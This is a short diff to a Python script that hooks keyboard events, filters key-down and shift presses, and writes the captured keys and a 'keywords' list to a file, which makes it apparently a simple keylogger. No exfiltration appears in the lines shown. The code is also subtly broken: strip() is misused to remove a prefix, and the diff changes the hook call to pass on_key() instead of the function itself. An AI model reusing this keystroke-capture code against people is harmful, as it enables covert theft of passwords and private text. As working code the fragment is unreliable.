@@ -23,17 +23,19 @@ def on_key():
 
     for i in events:
         istr = str(i)
-        if "down" in istr:
+        if "down" in istr and "shift" not in istr:
             istr = istr.strip("KeyboardEvent").split(" ")[0]+")"
             allkeys.append(istr)
 
         elif "shift" in istr:
-            istr = istr.strip("KeyboardEvent ").split(" ")[0]+")"
+            istr = istr.strip("KeyboardEvent ")
             allkeys.append(istr)
 
         else:
             continue
- 
+
+    file.write("\n")
+    file.write(str(keywords))
     file.write("\n")
     file.write(str(allkeys))
     file.write("\n")
@@ -42,5 +44,5 @@ def on_key():
 
 
 
-while True:
-    keyboard.hook(on_key())
+
+keyboard.hook(on_key())
